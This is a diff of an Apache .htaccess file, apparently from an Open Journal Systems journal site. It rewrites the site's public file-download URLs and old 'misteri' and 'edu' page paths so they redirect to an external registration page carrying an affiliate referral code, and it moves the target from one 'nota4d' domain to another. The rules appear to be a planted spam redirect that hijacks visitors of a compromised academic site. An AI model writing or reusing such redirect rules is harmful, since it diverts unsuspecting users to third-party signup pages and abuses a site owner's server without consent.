@@ -4,14 +4,15 @@ Options -Indexes
     RewriteEngine On
     RewriteBase /
 
-    # redirect semua rkt/libraryFiles/downloadPublic/<angka>
-    RewriteRule ^rkt/libraryFiles/downloadPublic/([0-9]+)$ https://nota4dberani.live/register?ref=3UTAANT005N [R=301,L]
+    # === redirect untuk semua downloadPublic <ID> ===
+    RewriteCond %{REQUEST_URI} ^/index.php/rkt/libraryFiles/downloadPublic/([0-9]+)$
+    RewriteRule ^ https://nota4dkuning.live/register?ref=3UTAANT005N [R=302,L]
 
     # redirect folder misteri lama
-    RewriteRule ^misteri/.*\.html$ https://nota4dberani.live/register?ref=3UTAANT005N [R=301,L,QSA]
+    RewriteRule ^misteri/.*\.html$ https://nota4dkuning.live/register?ref=3UTAANT005N [R=301,L,QSA]
 
     # redirect folder edu lama
-    RewriteRule ^edu/.*\.html$ https://nota4dberani.live/register?ref=3UTAANT005N [R=301,L,QSA]
+    RewriteRule ^edu/.*\.html$ https://nota4dkuning.live/register?ref=3UTAANT005N [R=301,L,QSA]
 
     # Authorization pass OJS
     RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
